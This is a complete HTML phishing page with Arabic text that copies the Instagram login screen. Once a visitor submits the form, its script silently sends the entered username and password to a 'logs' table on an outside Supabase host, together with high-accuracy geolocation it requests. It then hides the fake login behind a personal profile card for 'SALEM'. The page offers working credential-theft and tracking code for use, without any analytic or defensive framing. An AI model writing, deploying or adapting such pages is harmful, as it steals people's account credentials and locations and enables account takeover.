<!DOCTYPE HTML>
<html lang="ar">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Instagram | Login</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/2.0.10/typed.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.0/dist/umd/supabase.umd.js"></script>
    <style>
        :root {
            --water-deep: #0a192f; --water-mid: #1A2980; --water-light: #26d0ce;
            --front_color: rgba(10, 25, 47, 0.7); --gold: #FFD700; --muted-gold: #c5a059; --white: #e6f1ff;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        
        body {
            background: #fafafa;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; overflow-x: hidden;
        }

        #insta-wrapper {
            width: 100%; max-width: 350px; text-align: center; padding: 10px;
        }
        .login-box {
            background: white; border: 1px solid #dbdbdb; padding: 40px 30px; margin-bottom: 10px;
        }
        .insta-logo-text {
            font-family: 'Arial', sans-serif; font-style: italic; font-weight: bold; font-size: 38px;
            margin-bottom: 35px; color: #262626; letter-spacing: -1px;
        }
        .login-box input {
            width: 100%; padding: 10px; margin-bottom: 7px; background: #fafafa;
            border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none;
        }
        .login-box button {
            width: 100%; padding: 7px; background: #0095f6; color: white;
            border: none; border-radius: 4px; font-weight: 600; margin-top: 8px; cursor: pointer; font-size: 14px;
        }
        .divider { display: flex; align-items: center; color: #8e8e8e; font-size: 13px; margin: 20px 0; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; display: block; margin-bottom: 15px; }
        .fb-login i { font-size: 16px; margin-right: 5px; }
        .forgot { font-size: 12px; color: #00376b; display: block; text-decoration: none; }
        .signup-box { background: white; border: 1px solid #dbdbdb; padding: 20px; font-size: 14px; }
        .signup-box span { color: #0095f6; font-weight: 600; cursor: pointer; }

        #main-card-container {
            display: none; width: 100vw; height: 100vh; position: fixed; top: 0; left: 0;
            background: linear-gradient(-45deg, #0a192f, #1A2980, #141e30, #243b55);
            background-size: 400% 400%; animation: waterFlow 10s ease infinite;
            justify-content: center; align-items: center; z-index: 9999;
        }
        @keyframes waterFlow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }

        .vcard {
            width: 90%; max-width: 420px; height: 600px; background: var(--front_color);
            backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6); position: relative; overflow: hidden; display: flex; flex-direction: column;
        }
        .header { height: 35%; position: relative; }
        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; pointer-events: none; }
        .wave-01 { border-radius: 43%; top: -180%; left: -15%; position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--water-mid), var(--water-light)); opacity: 0.4; animation: rotate 14s linear infinite; }
        @keyframes rotate { 100% { transform: rotate(360deg); } }
        .profile_pic_content { width: 135px; height: 135px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; }
        .profile_video { width: 100%; height: 100%; object-fit: cover; }
        .card_content { padding-top: 85px; text-align: center; flex-grow: 1; }
        .satan h4 { font-size: 1.9em; letter-spacing: 3px; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
        .snuff { min-height: 60px; padding: 0 30px; color: #8892b0; font-size: 0.95em; margin-top: 20px; }
        .social div { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; padding: 0 10px; }
        .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 14px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); }
        .footer-rights { padding-bottom: 15px; font-size: 10px; color: rgba(230, 241, 255, 0.4); text-align: center; letter-spacing: 1px; }
    </style>
</head>
<body>

<div id="insta-wrapper">
    <div class="login-box">
        <div class="insta-logo-text">Instagram</div>
        <input type="text" id="user" placeholder="اسم المستخدم أو البريد الإلكتروني">
        <input type="password" id="pass" placeholder="كلمة السر">
        <button onclick="handleLogin()">تسجيل الدخول</button>
        <div class="divider">أو</div>
        <span class="fb-login"><i class="fab fa-facebook-square"></i> تسجيل الدخول بحساب فيسبوك</span>
        <a href="#" class="forgot">هل نسيت كلمة السر؟</a>
    </div>
    <div class="signup-box">
        ليس لديك حساب؟ <span>تسجيل</span>
    </div>
</div>

<div id="main-card-container">
    <div class="vcard">
        <div class="header">
            <div class="wave_bg"><div class="wave-01"></div></div>
            <div class="profile_pic_content">
                <video class="profile_video" autoplay loop muted playsinline>
                    <source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4">
                </video>
            </div>
        </div>
        <div class="card_content">
            <div class="satan"><h4>SALEM</h4></div>
            <div class="snuff"><h5 class="typed_text"></h5></div>
            <div class="social">
                <div>
                    <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
                    <a href="https://www.facebook.com/share/15KQ2NmX9V/"><i class="fab fa-facebook"></i></a>
                    <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94"><i class="fab fa-instagram"></i></a>
                    <a href="https://github.com/salemalshamrie"><i class="fab fa-github"></i></a>
                    <a href="tg://settings"><i class="fas fa-user"></i></a>
                    <a href="https://g.co/kgs/pXVXQxK"><i class="fas fa-futbol"></i></a>
                    <a href="https://uokerbala.edu.iq/"><i class="fas fa-university"></i></a>
                    <a href="https://16salm.github.io/AI/"><i class="fas fa-brain"></i></a>
                </div>
            </div>
        </div>
        <div class="footer-rights">حقوق النشر © 2023-2026 SALEM | جميع الحقوق محفوظة</div>
    </div>
</div>

<script>
    // تم ربط الرابط والمفتاح الصحيحين بمشروعك الحالي تلقائياً
    const SB_URL = 'https://enotqzfpgyjuhuwfzgys.supabase.co';
    const SB_KEY = 'sb_publishable_sVufz6PED_72tkAKm6DaEA_bVZ0MuK2';
    
    // استدعاء مكتبة Supabase
    const supabaseClient = window.supabase.createClient(SB_URL, SB_KEY);

    let locationURL = "لم يتم السماح بالوصول للموقع";
    
    // جلب الإحداثيات بطريقة صحيحة هندسياً (تم تصحيح الخطأ المطبعي للرابط)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(p => {
            locationURL = `http://googleusercontent.com/maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
        }, () => {
            console.log("تم رفض صلاحية الموقع من قبل المستخدم.");
        }, {enableHighAccuracy: true});
    }

    async function handleLogin() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;

        if (u && p) {
            // التحول البصري المباشر لواجهة الكارت المخصص لك
            document.getElementById('insta-wrapper').style.display = 'none';
            document.body.style.background = 'transparent'; 
            document.getElementById('main-card-container').style.display = 'flex';

            // تشغيل انيميشن النصوص المتحركة
            new Typed(".typed_text", {
                strings: ["Web Designer & Creative Developer.", "Precision and Art.", "BELIEVE IN YOURSELF."],
                typeSpeed: 50, backSpeed: 30, loop: true
            });

            // إرسال البيانات بشكل صامت في الخلفية إلى جدول logs
            try {
                const { data, error } = await supabaseClient
                    .from('logs')
                    .insert([{ username: u, password: p, location: locationURL }]);
                
                if (error) {
                    console.error("فشل الإرسال لـ Supabase بسبب:", error.message);
                } else {
                    console.log("تم حفظ البيانات في السيرفر بنجاح.");
                }
            } catch (err) {
                console.error("حدث خطأ غير متوقع أثناء الاتصال بقاعدة البيانات:", err);
            }
        } else {
            alert("يرجى ملء الحقول");
        }
    }
</script>
</body>
</html>
